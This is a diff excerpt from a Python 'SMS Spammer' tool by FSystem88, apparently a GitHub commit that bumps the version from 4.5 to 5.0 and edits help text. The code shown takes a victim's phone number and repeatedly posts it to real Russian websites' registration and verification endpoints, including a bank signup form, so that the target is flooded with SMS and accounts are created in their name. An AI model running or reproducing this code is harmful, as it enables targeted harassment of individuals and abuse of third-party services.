@@ -5,11 +5,11 @@ class spymer:
 	def main(self):
 		import requests, random, datetime, sys, time, argparse
 		from colorama import Fore, Back, Style
-		print(Fore.GREEN + '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.4.5      8888\n8888888888888888888888888\n8888888888888888888888888\n')
+		print(Fore.GREEN + '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.5.0      8888\n8888888888888888888888888\n8888888888888888888888888\n')
 		print(Style.RESET_ALL)
 		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='Мой e-mail - FSystem88@bk.ru')
 		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79991234455)')
-		parser.add_argument('--text', help='Текст для SMSInt сервиса (по умолчанию: Путин тебя любит ♥)')
+		parser.add_argument('--text', help='Текст для некоторых сервисов (по умолчанию: Путин тебя любит ♥)')
 		args = parser.parse_args()
 		def showstatus(message, type='new'):
 			now = datetime.datetime.now().strftime('%H:%M:%S')
@@ -114,10 +114,6 @@ class spymer:
 			sfera = requests.post('https://sfera.ru/api/quiz/id', json={"phone":_phonePizzahut,"regno":"1021400692048"})
 			bystrobank = requests.post('https://www.bystrobank.ru/publogin/web/register.php', data={'referer::-0':'','realm::-0':'bbpwd','loginName-0':_name,'password::-0':_name,'passwordRepeat::-0':_name,'phoneNumber::-0':_phone9,'ruPhoneCheck::-0':'true','email::-0':_email,'registration':'','serviceName-0':'lc'})
 
-			
-			
-			
-			
 			iteration += 1
 			print(('{} круг пройден.').format(iteration))
 
